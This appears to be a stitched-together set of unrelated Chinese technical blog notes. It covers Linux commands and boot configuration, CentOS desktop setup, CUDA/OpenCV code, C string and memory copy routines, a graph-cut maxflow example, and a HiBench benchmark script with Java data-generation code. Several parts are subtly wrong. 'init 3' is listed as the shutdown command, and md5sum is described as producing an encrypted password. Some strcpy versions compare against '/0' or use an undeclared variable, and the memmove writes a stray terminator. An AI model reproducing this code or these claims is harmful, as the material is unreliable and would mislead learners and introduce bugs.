-type 文件类型 f 二进制文件 l 软链接文件 d 目录
1.连接符 -a and 逻辑与 -o or 逻辑或
2.连接符 find .....-exec 命令 {} \;
                              {}find查询的结果
                               \转义符，使用符号命令本身的意思
                   -ok 询问确认
 


无论文件名叫什么都可以根据文件的i节点来进行查找
内核才能调用他。
 

文件搜索命令：locate

locate（搜索关键字）
列出所有跟file相关的文件
文件搜索命令：updatedb
执行权限：root
语法：updatedb
功能描述：建立整个系统目录文件的数据库
范例：#updatedb
 
文件搜索命令：grep


语法：grep[指定字串][源文件]
功能描述：在文件中搜索字串匹配的行并输出
范例：grep ftp /etc/services
 

帮助命令：
命令名称：man

命令的英文原意：manual
命令所在的路径：/user/bin/man
执行权限：所用用户
语法：man[命令或者配置文件]
功能描述：获得帮助信息
man ls 查看ls命令的帮助信息
man services 查看配置文件services的帮助信息
 
 
帮助指令：info
语法：info[任何关键字]
功能描述：获得帮助信息{unix中没有这个命令}
 
帮助命令：whatis

whatis whatis
指令名称：whatis apropos makewhatis
search the whatis database for strings
 
语法：whatis apropos [任何关键字]
功能描述：获得索引的简短说明信息
apropos fstab 相当于man -k
补充命令：help 查看shell内置命令的帮助
 
linux 常用命令：压缩解压命令

-gz
命令的英文原意：Gnu zip
语法：gzip 选项[文件]
功能描述：压缩文件
压缩后文件格式： .gz
1. 只能压缩文件，不能压缩目录
2.不保留源文件
 
解压缩命令：gunzip
语法：gunzip选项[压缩文件]
功能描述：解压缩.gz的压缩文件
范例：gunzip file1.gz
压缩解压目录：tar
命令名称：tar
语法 tar选项[cvf][目录]
     -c 产生.tar打包文件
     -v 显示详细信息
     -f 指定压缩后的文件名
     -z 打包的同时压缩
压缩后的文件格式：.tar.gz






                                            
 
2012-3-2
linux用户管理
用户信息文件：/etc/passwd
密码文件:/etc/shadow
用户组文件:/etc/group
用户组密码文件:/etc/gshadow
用户配置文件: /etc/login.defs  etc/default/useradd
新用户信息文件:/etc/ske 1
登陆信息:/etc/motd

linux用户分为三种:
超级用户:(root,UID =0)
普通用户:(UID:500-60000)
伪用户:(UID 1-499)

echo "123456" |md5sum ---产生123456的md5 加密密码
man 5 shadow 查看/etc/shadow中shadow的帮助,
 





 
centos6.0如果采用默认的最小化安装是没有安装桌面环境的，因此需要手动安装桌面环境。
我们可以用 #yum grouplist 查看已经安装的组件，以及支持安装的组件 首先，安装 X window system# yum groupinstall "
X Window system"由于centos6.0中只支持KDE组件，因此，安装KDE桌面环境#yum groupinstall "KDE Desktop"

开机为文本界面，由文本界面切换到图形界面：
    方法1：运行命令
          #startx ， 需要先配置图形界面信息
    方法2：修改/etc/inittab文件中的 
          id:3:initdefault ， 将3改为5 ，重新启动系统； 
    方法3：进入图形界面： init 5
 从图形界面进入文本界面： init 3
 重启： init 6
 关机： init 3 
真机环境中，在图形界面和文本界面间快捷键切换：
    Ctrl+Alt+F(n) , 其中F(n)为F1-F6 ，为6个控制台；
    Ctrl+ALT+F7 ；
eg:CTRL+ALT+F1是进入文本界面，CTRL+ALT+F7才是图形界面。
 

centos 下shutdown的命令后跟时间的单位是分钟
shutdown 60是60分钟后关机。

2012-1-20
从新安装了centos，选择desktop 安装桌面以及xwindows环境。1063个软件包。
2012-2-2
1.除了/之外所有字符都合法
2.有的字符，空格符，制表符，退格符和@#最好不要使用
3.避免使用.作为普通文件名的第一个字符。（.开头表示隐藏文件）
4.大小写敏感






                                            
 
2012-2-13
linux 引导流程
1.固件firmware（cmos，bios）-》post加点自检
2.自举程序Bootloader（grub）-》载入内核
3.载入内核                  -》驱动硬件
4.启动进程init              -》系统启动的第一个进程
5.读取执行配置文件 /etc/inittab
 
master boot record->MBR主引导扇区 位置：0驻面0磁头1扇区
插入图片：
bootloader中存放的是自举程序：
windows中为：--》ntldr 以及 boot.ini文件中的内容
linux中为：  --》/etc/grub.conf
 
 
init的工作：
init启动后读取inittab文件，执行缺省运行级别而继续从而引导过程。在unix系统中
，init时第一个可以存在的进程，它的PID恒为1，但他也同时必须向一个更高级的功能负责
：PID为0的内核调度器（kernel scheduler），从而获得cpu时间
 
 
 

inittab 文件剖析

在inittab中，所有的条目采取以下格式：
id：run-level:action:process
id:标示符，一般为两位数字或者字母或者数字
run—level：指定运行级别可以指定多个
action：指定运行状态
process：指定要运行的脚本/命令
 
action常用取值：
initdefault：指定系统缺省启动的运行级别
sysinit：系统启动执行process中的运行级别
wait：执行process中指定的命令，并等起结束再运行其他命令
once：执行process中指定的命令，不等待其结果
ctrlaltdel：按下Ctrl+alt+del时执行process指定的命令
powerfail：当出现电源错误时执行process指定的命令，不等待其结束
powerokwait：当电源恢复是执行process指定的命令
respawn：一旦process指定的命令中止，便重新运行该命名
 
任何的系统级别都会起动系统的启动脚本：
/etc/rc.d/rc.sysinit         
ls /etc/rc.d/rc3.d 可以看到系统启动对应级别下需要执行的脚本操作
/etc/rc.d/rc[0123456].d
分别存放对应于运行级别的服务程序脚本的符号链接，链接到init.d目录中相应的脚本
 
比如：s12syslog
s—start
k—kill
数字
脚本名称
 
启动流程：插入图片：

 
 






1.注意事项编译的办法参见：http://blog.csdn.net/wangyaninglm/article/details/39997113 以下是程序代码，网上搜的例子：注意事项：32位工程添加64位的支持（主要取决于你编译的版本），配置好cuda的项目路径include2.代码//swap.cu


#include "cuda_runtime.h"
#include "device_launch_parameters.h"

#include <opencv2/core/cuda_devptrs.hpp>
using namespace cv;
using namespace cv::gpu;

//自定义内核函数
__global__ void swap_rb_kernel(const PtrStepSz<uchar3> src,PtrStep<uchar3> dst)
{
    int x = threadIdx.x + blockIdx.x * blockDim.x;
    int y = threadIdx.y + blockIdx.y * blockDim.y;

    if(x < src.cols && y < src.rows)
    {
        uchar3 v = src(y,x);
        dst(y,x) = make_uchar3(v.z,v.y,v.x);
    }
}

extern "C" void swap_rb_caller(const PtrStepSz<uchar3>& src,PtrStep<uchar3> dst,cudaStream_t stream)
{
    dim3 block(32,8);
    dim3 grid((src.cols + block.x - 1)/block.x,(src.rows + block.y - 1)/block.y);

    swap_rb_kernel<<<grid,block,0,stream>>>(src,dst);
    if(stream == 0)
        cudaDeviceSynchronize();
}  //swap.cpp



#include <opencv2/gpu/gpu.hpp>
#include <opencv2/gpu/stream_accessor.hpp>


using namespace cv;
using namespace cv::gpu;

extern "C" void swap_rb_caller(const PtrStepSz<uchar3>& src,PtrStep<uchar3> dst,cudaStream_t stream);

extern "C" void swap_rb(const GpuMat& src,GpuMat& dst,Stream& stream = Stream::Null())
{
	CV_Assert(src.type() == CV_8UC3);
	dst.create(src.size(),src.type());
	cudaStream_t s = StreamAccessor::getStream(stream);
	swap_rb_caller(src,dst,s);
}
 //main.cpp

#include <iostream>
#include <opencv2/opencv.hpp>
#include <opencv2/gpu/gpu.hpp>

#pragma comment(lib,"opencv_gpu2410d.lib")
#pragma comment(lib,"opencv_core2410d.lib")
#pragma comment(lib,"opencv_highgui2410d.lib")

using namespace cv;
using namespace cv::gpu;

extern "C" void swap_rb(const GpuMat& src,GpuMat& dst,Stream& stream = Stream::Null());

int main()
{
	Mat image = imread("lena.jpg");
	imshow("src",image);
	GpuMat gpuMat,output;

	gpuMat.upload(image);
	swap_rb(gpuMat,output);
	output.download(image);

	imshow("gpu",image);
	getchar();
	waitKey(0);
	return 0;
} 3.实现效果： 4.其他注意事项假设有两个工程：CUDA工程TestCuda；C++工程CallCuda 1. 在CUDA工程TestCuda中， （1）.cpp文件（类成员函数定义）调用.cu文件下的函数例如.cu文件下的函数void run_kernel(); 其前面必须用 extern “C” 修饰。而.cpp文件（类成员函数定义）下的类成员函数，如，void cpp_run();如果它想调用 run_kernel()，则首先可在.h文件（类定义）中的类定义的外面先声明.cu文件下的C函数，例如，extern “C” void run_kernel();（2）CUDA工程属性-->常规中，选择配置类型为“静态库(.lib)”-->应用； 同时在工程属性下的库管理器-->常规项下的附加依赖项中，添加CUDA库：cudart.lib，curand.lib等；在附加库目录添加相应的库所在目录。2.另外的C++工程CallCuda 在CallCuda工程属性下，找到附加依赖项，添加：CUDA库(cudart.lib等)和TestCuda生成的静态库(TestCuda.lib)；以及添加附加库目录。 至此，该工程下的.cpp文件下的函数，就可以调用CUDA工程下的cpp_run()函数了，不过首先要实例化类。1.将example.cu添加到工程中。在已有工程上右键单击，选择添加已有项。2.添加编译规则。右键单击工程文件，选择“自定义生成规则”，在弹出的对话框中选择CUDA Build Rule x.x。3.修改.cu文件的编译器。右键单击.cu文件，单击属性，修改编译规则，选择刚才添加的CUDA编译器。4.添加包含目录。在项目属性-》C++->常规->附加包含目录中添加CUDA SDK的目录。例如"C:\Program Files\NVIDIA Corporation\NVIDIA GPU Computing SDK 3.2\C\common\inc";"C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v4.0\include"5.添加.lib文件。在链接器-》输入中添加cudart.lib cutil32D.lib6.修改代码生成为多线程(/MT)方式。7.Done.  以上是工程配置。 除此之外，还要把调用cuda代码的c++函数在.cu文件中用extern "C" 包含起来。并且在调用文件.cpp中用extern "C"声明该函数，然后调用。   





 代码来自：
 
http://blog.csdn.net/v_JULY_v
 
 
//得9 分
//为了实现链式操作，将目的地址返回，加2 分！
char * strcpy( char *strDest, const char *strSrc )
{
assert( (strDest != NULL) && (strSrc != NULL) );
char *address = strDest;
while( (*strDest++ = * strSrc++) != '/0' );
return address;
}

//得10 分，基本上所有的情况，都考虑到了
//如果有考虑到源目所指区域有重叠的情况，加1 分！
char * strcpy( char *strDest, const char *strSrc )
{
if(strDest == strSrc) { return strDest; }
assert( (strDest != NULL) && (strSrc != NULL) );
char *address = strDest;
while((*strDest++ = *strSrc++)!='/0');
return address;
}


 
 
strncpy 是 C语言的函数之一，来自 C语言标准库，定义于 string.h，char *strncpy(char *destin, char *source, int maxlen)，把src所指由NULL结束的字符串的前n个字节复制到dest所指的数组中。
char *strncpy(char *strDes, const char *strSrc, unsigned int count)
{
assert(strDes != NULL && strSrc != NULL);
char *address = strDes;
while (count-- && *strSrc != '/0')
*strDes++ = *strSrc++;
*strDes = '/0';
return address;
}
 
 
 
strcpy和memcpy都是标准C库函数，它们有下面特点：
strcpy提供了字符串的复制。即strcpy只用于字符串复制，并且它不仅复制字符串内容外，还会复制字符串的结束符。
strcpy的函数原型是：char* strcpy(char* dest, const char* src);
 
memcpy只提供一般的内存复制，即memcpy对于需要复制的内容没有限制，因此用途更广。
memcpy的函数原型是：void *memcpy(void *dest,  const char* src,  size_t count);
 
  char *strcpy(char *dest, const char *src)  {     if((src == NULL) || (dest == NULL))      {          return NULL;     }
      char *strdest = dest; // 保存目标字符串的首地址     while((*dest++ = *str) != '\0');
     return strdest;
 }


 
 


void *memcpy(void *memTo, const char *memFrom, size_t size)
{
     if((memTo == NULL) || (memFrom == NULL))
     {
          return NULL;
     }
     char *tempFrom = (char *)memFrom; //保存memFrom的首地址     char *tempTo = (char *)memTo; //保存memTo的首地址      while(size-- > 0)
     {
          *tempTo++ = *tempFrom++;
     }
     return memTo;
}


 
strcpy 和 memcpy主要有以下三方面的区别：
1、复制的内容不同。strcpy只能复制字符串，而memcpy可以复制任意内容，例如字符串、整型、结构体、类等。
2、复制的方法不同。strcpy不需要指定长度，它遇到被复制字符串的结束符"\0”才结束，所以容易溢出。memcpy则是根据第3个参数决定复制的长度。
3、用途不同。通常在复制字符串时用strcpy，而需要复制其它类型的数据是用memcpy。
 
memcpy 和 memmove 都是C语言中的库函数，在库函数 string.h中，其原型相似，它们都是从src所指向的内存中复制count个字节到dest所指内存中。并返回dest的值。
当源内存区域 和 目标内存区域无交叉重叠时，两者的结果是一样的，但如果有交叉呢？
memcpy是从src的其实部分开始复制，所以虽然第一种情况下没有问题，但如果遇到第二种情况，则会发生错误，交叉部分的src内容就会被覆盖掉了。
而memmove则由于采用不同的复制机制，所以可以正确处理第二种情况。
 
 


void *memmove(void *dst,const void *src,int n)
{
     char *dp = (char *)dst;
     char *sp = (char *)src; 
     assert((src!=0)&&(dst!=0)&&(n>0));//not　null 
     //非重叠 
      //dp < sp 
     //dp > (sp+n)     if(sp>dp||(sp+n)<dp)
     { 
         while(n--) 
             *(dp++) = *(sp++);
         *dp = '\0';
     }
     else if(sp<dp)//重叠 (此时条件 sp<dp<(sp+n))如果sp==dp则快速的返回     {//反向拷贝            sp += n; 
         dp += n; 
         *dp = '\0'; 
         while(n--)
            *(--dp) = *(--sp); 
     }
     return dst;
}       


 
在很多库函数上看到使用了assert()函数，assert函数的作用是计算表达式expression ，如果其值为假（即为0），那么它先向stderr打印一条错误信息，然后调用abort()来终止进程。
函数名: abort
功 能: 异常终止一个进程
描述：abort()函数首先解除进程对SIGABRT信号的阻止，然后向调用进程发送该信号。abort()函数会导致进程的异常终止除非SIGABRT信号被捕捉并且信号处理句柄没有返回。
abort()函数导致所有的流被关闭和冲洗。
abort()函数没有返回值：void abort(void);
用 法: void abort(void);
程序例:
#include <stdio.h>
#include <stdlib.h>
int main(void) 
{ 
printf("Calling abort()\n");
abort();
return 0; /* This is never reached */
 }




 






下面是一个百度空间的：
http://hi.baidu.com/jensenliao

博客园的一篇博客：theONE模拟器简介（主要讲述，软件配置，软件结构）
http://www.cnblogs.com/dreamfactory/archive/2012/07/27/2612215.html

博客园，theONE模拟器简介，图表脚本生成，路由修改
http://www.cnblogs.com/jcleung/archive/2011/05/23/2054713.html

csdn，theONE消息转发流程分析
http://blog.csdn.net/u010816631/article/details/8984596


QQ交流群：


DTN--(ONE)  群   号：9859819
DTN            群号：17384685
















 
 图割论文大合集下载：
http://download.csdn.net/detail/wangyaninglm/8292305
 
代码：
/* graph.h */
/* Vladimir Kolmogorov (vnk@cs.cornell.edu), 2001. */

/*
	This software library is a modification of the maxflow algorithm
	described in

	An Experimental Comparison of Min-Cut/Max-Flow Algorithms
	for Energy Minimization in Computer Vision.
	Yuri Boykov and Vladimir Kolmogorov.
	In Third International Workshop on Energy Minimization
	Methods in Computer Vision and Pattern Recognition, September 2001

	This algorithm was originally developed at Siemens.
	The main modification is that two trees are used for finding
	augmenting paths - one grows from the source and the other
	from the sink. (The original algorithm used only the former one).
	Details will be described in my PhD thesis.

	This implementation uses an adjacency list graph representation.邻接链表
	Memory allocation:
		Nodes: 22 bytes + one field to hold a residual capacity
		       of t-links (by default it is 'short' - 2 bytes)
		Arcs: 12 bytes + one field to hold a residual capacity 剩余容量
		      (by default it is 'short' - 2 bytes)
	(Note that arcs are always added in pairs （弧都是成对的添加）- in forward and reverse directions)

	Example usage (computes a maxflow on the following graph):

		        SOURCE
		       /       \
		     1/         \2
		     /      3    \
		   node0 -----> node1
		     |   <-----   |
		     |      4     |
		     \            /
		     5\          /6
		       \        /
		          SINK

	///////////////////////////////////////////////////

	#include <stdio.h>
	#include "graph.h"

	void test_maxflow()
	{
		Graph::node_id nodes[2];
		Graph *g = new Graph();

		nodes[0] = g -> add_node();
		nodes[1] = g -> add_node();
		g -> set_tweights(nodes[0], 1, 5);
		g -> set_tweights(nodes[1], 2, 6);
		g -> add_edge(nodes[0], nodes[1], 3, 4);

		Graph::flowtype flow = g -> maxflow();

		printf("Flow = %d\n", flow);
		printf("Minimum cut:\n");
		if (g->what_segment(nodes[0]) == Graph::SOURCE)
			printf("node0 is in the SOURCE set\n");
		else
			printf("node0 is in the SINK set\n");
		if (g->what_segment(nodes[1]) == Graph::SOURCE)
			printf("node1 is in the SOURCE set\n");
		else
			printf("node1 is in the SINK set\n");

		delete g;
	}

	///////////////////////////////////////////////////
*/

 
 
void test_maxflow()
{
	Graph::node_id nodes[2];
	Graph *g = new Graph();

	nodes[0] = g -> add_node();
	nodes[1] = g -> add_node();
	g -> set_tweights(nodes[0], 3, 3);
	g -> set_tweights(nodes[1], 3, 1);
	g -> add_edge(nodes[0], nodes[1], 1, 0);

	Graph::flowtype flow = g -> maxflow();

	printf("Flow = %d\n", flow);
	printf("Minimum cut:\n");
	if (g->what_segment(nodes[0]) == Graph::SOURCE)
		printf("node0 is in the SOURCE set\n");
	else
		printf("node0 is in the SINK set\n");
	if (g->what_segment(nodes[1]) == Graph::SOURCE)
		printf("node1 is in the SOURCE set\n");
	else
		printf("node1 is in the SINK set\n");

	delete g;
}

 
 

 
 
这块主要就是要理解，什么是maxflow，以及节点最后分割的类型是SOURCE还是SINK分别意味着什么
 
graphcuts算法时间复杂度与其他最大流算法的比较：

 
 
 
添加几篇文章地址：
 
graphcuts资料博客大合集
http://vision.csd.uwo.ca/code/
 
http://lincccc.blogspot.tw/2011/04/graph-cut-and-its-application-in.html
http://blog.csdn.net/zouxy09/article/details/8532106
http://lincccc.blogspot.tw/2011/03/cuda-cuts-fast-graph-cuts-on-gpu_03.html
http://blog.csdn.net/hebby06/article/details/5341228









1.HiBench算法简介
Hibench 包含9个典型的hadoop负载（micro benchmarks,hdfs benchmarks,web search bench marks,machine learning benchmarks和data analytics benchmarks）
具体参考CDH集群安装&测试总结：第三节内容

micro benchmarks 
Sort:使用hadoop randomtextwriter生成数据，并对数据进行排序。 
Wordcount:统计输入数据中每个单词的出现次数，输入数据使用hadoop randomtextwriter生成。 
TeraSort：输入数据由hadoop teragen产生，通过key值进行排序。
hdfs benchmarks 
增强行的dfsio：通过产生大量同时执行读写请求的任务测试hadoop机群的hdfs吞吐量
web search bench marks 
Nutch indexing:大规模收索引擎，这个是负载测试nutch（apache的一个开源搜索引擎）的搜索子系统，使用自动生成的web数据，web数据中的连接和单词符合zipfian分布（一个单词出现的次数与它在频率表的排名成反比） 
Pagerank:这个负载包含在一种在hadoop上的pagerank的算法实现，使用自动生成的web数据，web数据中的链接符合zipfian分布。（对于任意一个term其频度（frequency）的排名（rank）和frequency的乘积大致是一个常数）
machine learning benchmarks 
Mahout bayesian classification(bayes):大规模机器学习，这个负载测试mahout（apache开源机器学习库）中的naive bayesian 训练器，输入的数据是自动生成的文档，文档中的单词符合zipfian分布。 
Mahout k-means clustering(kmeans):测试mahout中的k-means聚类算法，输入的数据集由基于平均分布和高斯分布的genkmeansdataset产生。
data analytics benchmarks 
Hive query benchmarks(hivebench):包含执行的典型olap查询的hive查询（aggregation和join），使用自动生成的web数据，web数据的链接符合zipfian分布。

注：使用的生成数据程序在hadoop-mapreduce-examples-2.6.0 jar 包内，可以使用反编译工具查看。


2.HiBench中bayes算法流程

主要流程为conf下配置测试项，测试语言和DataSize，然后运行bin下run-all.sh完成一次测试，此流程为手动完成，可以编写脚本重复此步骤完成多次测试减少手动操作； 
e.g.

#!/bin/bash

#       Time: 20160930,created by sunfei
#       Describe: automatic run the hibench
#       Functions :
#            search(): Find the style of application in the  99-user_defined_properties.conf,eg:tiny,small..
#                               exec_application_noSQL(): run the application for times,and no use hive
#                               exec_application_SQL(): run the application for times,and use hive
#                               save_result(): save the result of application
#                               main_function(): the main function of running all the appliction
#                               main(): the main function of running different kind application


cpuLoad()
{
        cpu=`grep -c 'model name' /proc/cpuinfo`
        load_15=`uptime | awk '{print $NF}'`
        average_load=`echo "scale=2;a=${load_15}/${cpu};if(length(a)==scale(a)) print 0;print a" | bc`
        date >> datetime-load.txt
        ${average_load} >> cpu-load.txt
        paste datetime-load.txt cpu-load.txt >> load-day.txt
}

search()
{
        #config="/opt/HiBench/HiBench-master/conf/99-user_defined_properties.conf"
        config=/usr/HiBench-master/conf/99-user_defined_properties.conf
        sed -n '/hibench.scale.profile/p' ${config} >> hibench.txt
        var=''
        while read line
        do
                        if [ ${line:0:13} = "hibench.scale" ];then
                                        echo -e "\033[32m match sucessfull! \033[0m"
                                        var=${line:22}
                        fi
        done<"hibench.txt"

        if [ "$var" = "${1}" ];then
                echo -e "\033[31m The style of application can't same,do you want to continue? yes | no \033[0m"
                read -p "Input your chose :" chose
                if [ "${chose}" = "no" ];then
                        exit 1
                else
                        echo -e "\033[32m The ${1}  style of application will be run! \033[0m"
                fi
        fi

        if [ -f "hibench.txt" ];then
                        rm -rf "hibench.txt"
                        echo -e "\033[32m The hibench.txt has deleted! \033[0m"
        fi

        echo -e "\033[32m The application will run the "${1}" style \033[0m"
    sed -i "s/${var}/${1}/" ${config}
}

exec_application_noSQL()
{
        var=0
        for ((i=1;i<=${1};i++))
        do
                        let "var=$i%1"
                        if [ "$var" -eq 0 ];then
                                        hadoop fs -rm  -r hdfs://archive.cloudera.com:8020/user/hdfs/.Trash/*
                                        hadoop fs -rm -r hdfs://archive.cloudera.com:8020/HiBench/*
                        fi
                        echo -e  "\033[32m **********************The current times is ********************:\033[0m" ${i}
                        #/opt/HiBench/HiBench-master/bin/run-all.sh
                        /usr/HiBench-master/bin/run-all.sh
                        echo -e  "\033[32m ********************** The current time is "${i}" ,and it has exec finished successfully! ********************:\033[0m"
        done
        echo -e "\033[32m *********The application has finished,please modify the configuration!***** \033[0m"
}

exec_application_SQL()
{
        var=0
        for ((i=1;i<=${1};i++))
        do
                        echo "drop table uservisits;drop table uservisits_aggre;drop table rankings;drop table rankings_uservisits_join;drop table uservisits_copy;exit;" | /usr/bin/hive
                        let "var=$i%1"
                        if [ "$var" -eq 0 ];then
                                        hadoop fs -rm  -r hdfs://archive.cloudera.com:8020/user/hdfs/.Trash/*
                                        hadoop fs -rm -r hdfs://archive.cloudera.com:8020/HiBench/*
                        fi
                        echo -e  "\033[32m **********************The current times is ********************:\033[0m" ${i}
                        #/opt/HiBench/HiBench-master/bin/run-all.sh
                        /usr/HiBench-master/bin/run-all.sh
                        echo -e  "\033[32m **********************The current time is "${i}" ,and it has exec finished successfully! ********************:\033[0m"
        done
        echo -e "\033[32m *********The application has finished,please modify the configuration!***** \033[0m"

}

save_result()
{
        if [ -f result.txt ];then
                        rm -rf result.txt
                         echo -e "\033[32m The hibench.txt has deleted! \033[0m"
        fi
        #select the words in the report
        #filepath=/opt/HiBench/HiBench-master/report/hibench.report
        filepath=/usr/HiBench-master/report/hibench.report
        word=""
        var1=`date +"%m/%d/%Y-%k:%M:%S"`
        var2=${1}
        var5=".txt"
        var4=${var2}${var5}
        case ${1} in
        "aggregation")
                word="JavaSparkAggregation"
                ;;
        "join")
                word="JavaSparkJoin"
                ;;
        "scan")
                word="JavaSparkScan"
                ;;
        "kmeans")
                word="JavaSparkKmeans"
                ;;
        "pagerank")
                word="JavaSparkPagerank"
                ;;
        "sleep")
                word="JavaSparkSleep"
                ;;
        "sort")
                word="JavaSparkSort"
                ;;
        "wordcount")
                word="JavaSparkWordcount"
                ;;
        "bayes")
                word="JavaSparkBayes"
                ;;
        "terasort")
                word="JavaSparkTerasort"
                ;;
        *)
                echo -e "\033[32m The name of application is wrong,please change it! \033[0m"
                ;;
        esac

        while read line
        do
                        echo $line | sed -n "/${word}/p" >> ${var4}
        done <$filepath
        echo -e "\033[32m The job has finished! \033[0m"
}

main_function()
{
        #Input the name of application need to exec
        for appName in aggregation join scan pagerank sleep sort wordcount bayes terasort kmeans
        do
                #appConfig=/opt/HiBench/HiBench-master/conf/benchmarks.lst
                appConfig=/usr/HiBench-master/conf/benchmarks.lst
                echo "The name of application is :"${appName}
                echo ${appName} > ${appConfig}
                        for style in tiny small large huge gigantic
                        do
                                search ${style}
                                if [ "aggregation" = ${appName} ] || [ "join" = ${appName} ] || [ "scan" = ${appName} ];then
                                                        exec_application_SQL ${1}
                                else
                                                        exec_application_noSQL ${1}
                                fi
                        done
                save_result ${appName}
        done
}

main()
{
        # run the application
        read -p "Input the times of exec: " times
        if [ "${times}" -eq 0 -o "${times}" -gt 60 ];then
                echo -e "\033[31m The times of application can't be empty or gt 60 ! Do you want to continue ? yes | no\033[0m"
                read -p "Input your chose :" chose
                if [ "${chose}" = "no" ];then
                        exit 1
                else
                        echo -e "\033[32m The application will be run ${times} times ! \033[0m"
                fi
        fi
        echo -e "\033[33m Select the style of application : \033[0m \033[31m All | Signal \033[0m"
        read -p "Input your chose :" style
        if [ "${style}" = "" ];then
                echo -e "\033[31m The style of application can't be empty \033[0m"
                exit 1
        elif [ "${style}" != "All" -a "${style}" != "Signal" ];then
                echo -e "\033[31m The style of application is wrong,please correct! \033[0m"
                exit 1
        else
                echo -e "\033[32m The style of application is ok ! \033[0m"
        fi
        if [ "All" = "${style}" ];then
                main_function ${times}
        else
                echo -e "\033[033m Input the name of apliaction,eg:\033[0m \033[31m aggregation | join | scan | kmeans | pagerank | sleep | sort | wordcount | bayes | terasort\033[0m"
                read -p "Input you chose :" application
                if [ "${application}" = "" ];then
                                echo -e "\033[31m The name of application can't be empty! \033[0m"
                                exit 1
                fi
                echo "********************The ${application} will be exec**********************"
                appConfig=/usr/HiBench-master/conf/benchmarks.lst
                #appConfig=/opt/HiBench/HiBench-master/conf/benchmarks.lst
                read -p "Do you want exec all the style of application,eg:tiny,small,large,huge,gigantic? yes | no " chose
                if [ "${chose}" = "" ];then
                        echo -e "\033[31m The style of application can't be empty! \033[0m"
                        exit 1
                elif [ "yes" != ${chose} ] && [ "no" != ${chose} ];then
                        echo -e "\033[31m The style of application is wrong,please correct! \033[0m"
                        exit 1
                else
                        echo -e "\033[32m The style of application is ok ! \033[0m"
                fi
                read -p "Input the sytle of application,eg:( tiny small large huge gigantic )!" appStyle
                echo "***************************The ${appStyle} style will be exec***************************"
                for appName in ${application}
                do
                        echo ${appName} > ${appConfig}
                        if [ "yes" = "${chose}" ];then
                                for var in tiny small large huge gigantic
                                do
                                        echo "******************The ${appName} will be exec!************************************"
                                        search ${var}
                                        if [ "aggregation" = ${appName} ] || [ "join" = ${appName} ] || [ "scan" = ${appName} ];then
                                                        exec_application_SQL ${times}
                                        else
                                                        exec_application_noSQL ${times}
                                        fi
                                done
                        else
                        #       read -p "Input the sytle of application,eg:( tiny small large huge gigantic )!" appStyle
                                echo "**************************The ${appName} will be exec!************************"
                                if [ "${appStyle}" = "" ];then
                                                echo -e "\033[31m The style of application can't be empty! \033[0m"
                                                exit 1
                                fi
                                for var in ${appStyle}
                                do
                                        search ${var}
                                        if [ "aggregation" = ${appName} ] || [ "join" = ${appName} ] || [ "scan" = ${appName} ];then
                                                exec_application_SQL ${times}
                                        else
                                                exec_application_noSQL ${times}
                                        fi
                                done
                        fi
                        save_result ${appName}
                done
        fi
}

# the main function of application
main

prepare.sh->run.sh为run-all.sh的子流程；
enter_bench->…->leave_bench为prepare.sh和run.sh的子流程；
enter_bench…..gen_report等为workload-functions.sh中的公共函数。

流程图如下：

2.1 数据生成代码分析，接口：HiBench.DataGen
对java代码我不太熟悉，接口中我看主要用了一个switch语句
DataGen类中DataOptions options = new DataOptions(args); 
如果是bayes测试的话，就调用对应的数据生成类，进行数据生成。生成的数据接口部分代码：
case BAYES: {
                BayesData data = new BayesData(options);
                data.generate();
                break;
            }
BayesData实现：
package HiBench;

import java.io.IOException;
import java.net.URISyntaxException;
import java.util.Random;

import org.apache.commons.logging.Log;
import org.apache.commons.logging.LogFactory;
import org.apache.hadoop.fs.Path;
import org.apache.hadoop.io.LongWritable;
import org.apache.hadoop.io.Text;
import org.apache.hadoop.mapred.FileInputFormat;
import org.apache.hadoop.mapred.FileOutputFormat;
import org.apache.hadoop.mapred.JobClient;
import org.apache.hadoop.mapred.JobConf;
import org.apache.hadoop.mapred.MapReduceBase;
import org.apache.hadoop.mapred.Mapper;
import org.apache.hadoop.mapred.OutputCollector;
import org.apache.hadoop.mapred.Reporter;
import org.apache.hadoop.mapred.SequenceFileOutputFormat;
import org.apache.hadoop.mapred.lib.NLineInputFormat;

public class BayesData {

    private static final Log log = LogFactory.getLog(BayesData.class.getName());

    private DataOptions options;
    private Dummy dummy;
    private int cgroups;

    BayesData(DataOptions options) {
        this.options = options;
        parseArgs(options.getRemainArgs());
    }

    private void parseArgs(String[] args) {

        for (int i=0; i<args.length; i++) {
            if ("-class".equals(args[i])) {
                cgroups = Integer.parseInt(args[++i]);
            } else {
                DataOptions.printUsage("Unknown bayes data arguments -- " + args[i] + "!!!");
                System.exit(-1);
            }
        }
    }

    private static class CreateBayesPages extends MapReduceBase implements
    Mapper<LongWritable, Text, Text, Text> {

        private static final Log log = LogFactory.getLog(CreateBayesPages.class.getName());

        private long pages, slotpages;
        private int groups;
        private HtmlCore generator;
        private Random rand;

        public void configure(JobConf job) {
            try {
                pages = job.getLong("pages", 0);
                slotpages = job.getLong("slotpages", 0);
                groups = job.getInt("groups", 0);

                generator = new HtmlCore(job);
            } catch (IOException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
        }

        @Override
        public void map(LongWritable key, Text value,
                OutputCollector<Text, Text> output, Reporter reporter)
                throws IOException {

            int slotId = Integer.parseInt(value.toString().trim());
            long[] range = HtmlCore.getPageRange(slotId, pages, slotpages);
            generator.fireRandom(slotId);
            rand = new Random(slotId * 1000 + 101);

            Text k = new Text();
            for (long i=range[0]; i<range[1]; i++) {
                String classname = "/class" + rand.nextInt(groups);
                k.set(classname);
                value.set(generator.genBayesWords());
                output.collect(k, value);
                reporter.incrCounter(HiBench.Counters.BYTES_DATA_GENERATED,
                    k.getLength()+value.getLength());
                if (0==(i % 10000)) {
                    log.info("still running: " + (i - range[0]) + " of " + slotpages);
                }
            }
        }
    }

    private void setBayesOptions(JobConf job) throws URISyntaxException {
        job.setLong("pages", options.getNumPages());
        job.setLong("slotpages", options.getNumSlotPages());
        job.setInt("groups", cgroups);

        Utils.shareWordZipfCore(options, job);
    }

    private void createBayesData() throws IOException, URISyntaxException {

        log.info("creating bayes text data ... ");

        JobConf job = new JobConf();

        Path fout = options.getResultPath();
        Utils.checkHdfsPath(fout);

        String jobname = "Create bayes data";
        job.setJobName(jobname);

        Utils.shareDict(options, job);

        setBayesOptions(job);

        FileInputFormat.setInputPaths(job, dummy.getPath());
        job.setInputFormat(NLineInputFormat.class);

        job.setJarByClass(CreateBayesPages.class);
        job.setMapperClass(CreateBayesPages.class);
        job.setNumReduceTasks(0);

        FileOutputFormat.setOutputPath(job, fout);
